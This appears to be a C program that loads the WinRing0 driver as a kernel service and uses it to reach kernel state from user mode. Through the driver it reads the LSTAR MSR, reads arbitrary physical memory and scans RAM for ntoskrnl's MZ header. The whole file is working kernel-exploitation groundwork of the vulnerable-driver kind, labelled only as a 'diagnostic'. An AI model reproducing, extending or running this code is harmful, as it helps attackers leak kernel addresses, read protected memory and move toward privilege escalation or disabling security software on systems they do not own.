/*
 * winring0_pa_probe.c -- raw PA read diagnostic
 * confirms whether 0x9C4060C4 actually returns physical memory data
 * clang winring0_pa_probe.c -o winring0_pa_probe.exe -lkernel32 -ladvapi32
 */
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define OLS_DEVICE       "\\\\.\\WinRing0_1_2_0"
#define OLS_SVC          "WinRing0_1_2_0"
#define OLS_READ_MEM     0x9C4060C4UL
#define OLS_READ_MSR     0x9C402084UL

#pragma pack(push,1)
typedef struct { ULONGLONG PhysAddr; DWORD UnitSize; DWORD Count; } MEM_IN;
typedef struct { DWORD Index; } MSR_IN;
typedef struct { DWORD Lo; DWORD Hi; } MSR_OUT;
#pragma pack(pop)

static BOOL svc_load(const char *abs) {
    char nt[MAX_PATH+8]; snprintf(nt,sizeof(nt)-1,"\\??\\%s",abs);
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(!scm) return FALSE;
    SC_HANDLE s=OpenServiceA(scm,OLS_SVC,SERVICE_ALL_ACCESS);
    if(s){SERVICE_STATUS ss={0};ControlService(s,SERVICE_CONTROL_STOP,&ss);
          Sleep(300);DeleteService(s);CloseServiceHandle(s);Sleep(300);}
    s=CreateServiceA(scm,OLS_SVC,OLS_SVC,SERVICE_ALL_ACCESS,
                     SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,
                     SERVICE_ERROR_NORMAL,nt,NULL,NULL,NULL,NULL,NULL);
    if(!s){CloseServiceHandle(scm);return FALSE;}
    BOOL ok=StartServiceA(s,0,NULL);
    if(!ok&&GetLastError()==ERROR_SERVICE_ALREADY_RUNNING)ok=TRUE;
    CloseServiceHandle(s);CloseServiceHandle(scm);
    if(ok)Sleep(400); return ok;
}
static void svc_unload(void){
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(!scm)return;
    SC_HANDLE s=OpenServiceA(scm,OLS_SVC,SERVICE_ALL_ACCESS);
    if(s){SERVICE_STATUS ss={0};ControlService(s,SERVICE_CONTROL_STOP,&ss);
          Sleep(200);DeleteService(s);CloseServiceHandle(s);}
    CloseServiceHandle(scm);
}
static BOOL read4(HANDLE dev, uint64_t pa, DWORD *out){
    MEM_IN in={.PhysAddr=pa,.UnitSize=4,.Count=1};
    DWORD ret=0,val=0;
    BOOL ok=DeviceIoControl(dev,OLS_READ_MEM,&in,sizeof(in),&val,4,&ret,NULL);
    *out=val; return ok;
}

int main(int argc, char **argv){
    const char *path=argc>1?argv[1]:"..\\..\\WinRing0x64.sys";
    char abs[MAX_PATH]={0}; GetFullPathNameA(path,MAX_PATH,abs,NULL);

    HANDLE ht=NULL;
    OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&ht);
    LUID l; LookupPrivilegeValueA(NULL,"SeLoadDriverPrivilege",&l);
    TOKEN_PRIVILEGES tp={1,{{l,SE_PRIVILEGE_ENABLED}}};
    AdjustTokenPrivileges(ht,FALSE,&tp,sizeof(tp),NULL,NULL); CloseHandle(ht);

    if(!svc_load(abs)){printf("[-] load failed: %lu\n",GetLastError());return 1;}

    HANDLE dev=CreateFileA(OLS_DEVICE,GENERIC_READ|GENERIC_WRITE,0,NULL,
                            OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(dev==INVALID_HANDLE_VALUE){
        printf("[-] open failed: %lu\n",GetLastError());svc_unload();return 1;}
    printf("[+] handle: %p\n\n", (void*)dev);

    /* 1. MSR sanity -- confirms IOCTLs work */
    MSR_IN mi={.Index=0xC0000082}; MSR_OUT mo={0}; DWORD ret=0;
    BOOL ok=DeviceIoControl(dev,OLS_READ_MSR,&mi,sizeof(mi),&mo,sizeof(mo),&ret,NULL);
    uint64_t lstar=((uint64_t)mo.Hi<<32)|mo.Lo;
    printf("[MSR] LSTAR=%s  0x%016llX\n", ok?"OK":"FAIL",
           (unsigned long long)lstar);

    /* 2. Physical read test at several KNOWN mapped PAs */
    printf("\n[PA READ TEST]\n");
    uint64_t test_pas[]={
        0x1000ULL,       /* real-mode IVT -- always mapped */
        0x2000ULL,
        0x100000ULL,     /* 1 MB -- conventional boundary  */
        0x200000ULL,
        0x1000000ULL,    /* 16 MB                          */
        0x2000000ULL,
        0x10000000ULL,   /* 256 MB                         */
        0x40000000ULL,   /* 1 GB                           */
        0x100000000ULL,  /* 4 GB                           */
        0x200000000ULL,  /* 8 GB                           */
    };
    int nonzero=0;
    for(int i=0;i<(int)(sizeof(test_pas)/sizeof(test_pas[0]));i++){
        DWORD val=0;
        BOOL r=read4(dev,test_pas[i],&val);
        printf("  PA=0x%010llX  %s  0x%08lX  err=%lu%s\n",
               (unsigned long long)test_pas[i],
               r?"OK  ":"FAIL",
               (unsigned long)val,
               r?0UL:GetLastError(),
               val?"":" <-- ZERO");
        if(val) nonzero++;
    }

    printf("\n");
    if(!nonzero){
        printf("*** ALL ZEROS -- READ_MEM IOCTL not returning physical data ***\n");
        printf("*** MmMapIoSpace failing for RAM on this system (Hyper-V?) ***\n");
    } else {
        printf("[+] %d non-zero reads -- IOCTL working, scan step issue\n",nonzero);
        printf("[+] need finer scan step (512KB or 4KB)\n");

        /* 3. narrow scan: try 512KB steps around the region where
         *    LSTAR-0x400000 to LSTAR+0x2000000 might be ntoskrnl PA */
        printf("\n[NARROW SCAN] 512KB steps, reading first DWORD only:\n");
        for(uint64_t pa=0x1000000ULL; pa<0x800000000ULL; pa+=0x80000ULL){
            DWORD dw=0;
            if(!read4(dev,pa,&dw)) continue;
            if((dw&0xFFFF)==0x5A4D){
                printf("  MZ at PA=0x%010llX  raw=0x%08lX\n",
                       (unsigned long long)pa,(unsigned long)dw);
            }
        }
        printf("[narrow scan done]\n");
    }

    CloseHandle(dev); svc_unload();
    return 0;
}